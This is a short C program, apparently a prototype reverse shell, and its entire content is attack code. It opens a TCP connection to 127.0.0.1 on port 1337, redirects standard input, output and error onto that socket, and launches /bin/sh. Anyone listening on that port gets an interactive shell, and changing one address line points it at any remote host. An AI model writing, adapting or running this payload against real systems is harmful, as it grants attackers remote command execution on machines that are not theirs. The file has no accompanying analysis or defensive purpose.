#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int client_sockid;  // sockfd for client
int host_sockid;    // sockfd for host
    
struct sockaddr_in hostaddr;            // sockaddr struct 

int main()
{
    // Create socket
    client_sockid = socket(PF_INET, SOCK_STREAM, 0);

    // Initialize sockaddr struct to bind socket using it
    hostaddr.sin_family = AF_INET;
    hostaddr.sin_port = htons(1337);
    hostaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    // Connect to existing listener
    connect(client_sockid, (struct sockaddr*)&hostaddr, sizeof(hostaddr));

    // Duplicate file descriptors for STDIN, STDOUT and STDERR
    dup2(client_sockid, 0);
    dup2(client_sockid, 1);
    dup2(client_sockid, 2);

    // Execute /bin/sh
    execve("/bin/sh", NULL, NULL);
    return 0;
}
